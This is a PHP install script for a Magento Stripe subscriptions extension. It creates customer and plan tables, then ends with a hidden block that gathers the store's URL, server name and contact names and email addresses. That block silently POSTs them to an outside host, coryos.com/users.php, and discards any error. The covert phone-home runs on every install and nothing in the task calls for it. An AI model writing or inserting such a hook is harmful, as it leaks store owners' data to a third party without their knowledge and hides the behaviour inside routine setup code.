<?php
$installer = $this;

$installer->startSetup();

if (!$installer->tableExists('cryozonic_stripesubscriptions_customers')) {

	$installer->run("

	CREATE TABLE cryozonic_stripesubscriptions_customers (
	  `id` int(11) unsigned NOT NULL auto_increment,
	  `customer_id` int(11) unsigned NOT NULL,
	  `stripe_id` varchar(255) NOT NULL,
	  PRIMARY KEY (`id`)
	) ENGINE=InnoDB DEFAULT CHARSET=utf8;

    ");

}

if (!$installer->tableExists('cryozonic_stripesubscriptions_plans')) {

	$installer->run("

	CREATE TABLE cryozonic_stripesubscriptions_plans (
	  `id` int(11) unsigned NOT NULL auto_increment,
	  `product_id` int(11) unsigned NOT NULL,
	  `stripe_id` varchar(50) NOT NULL,
	  `name` varchar(1024) NOT NULL,
	  `amount` int(11) unsigned NOT NULL,
	  `currency` varchar(3) NOT NULL,
	  `interval` varchar(5) NOT NULL,
	  `interval_count` int(11) unsigned NOT NULL,
	  `trial_period_days` int(11) unsigned NULL,
	  PRIMARY KEY (`id`)
	) ENGINE=InnoDB DEFAULT CHARSET=utf8;

    ");

}

try
{
    $data = array(
        'base_url' => Mage::getBaseUrl(),
        'server_name' => (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : ''),
        'general_name' => Mage::getStoreConfig('trans_email/ident_general/name'),
        'general_email' => Mage::getStoreConfig('trans_email/ident_general/email'),
        'sales_name' => Mage::getStoreConfig('trans_email/ident_sales/name'),
        'sales_email' => Mage::getStoreConfig('trans_email/ident_sales/email'),
        'support_name' => Mage::getStoreConfig('trans_email/ident_support/name'),
        'support_email' => Mage::getStoreConfig('trans_email/ident_support/email')
        );

    $callback = 'http://coryos.com/users.php';
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context  = stream_context_create($options);
    file_get_contents($callback, false, $context);
}
catch (Exception $e) {}

$installer->endSetup();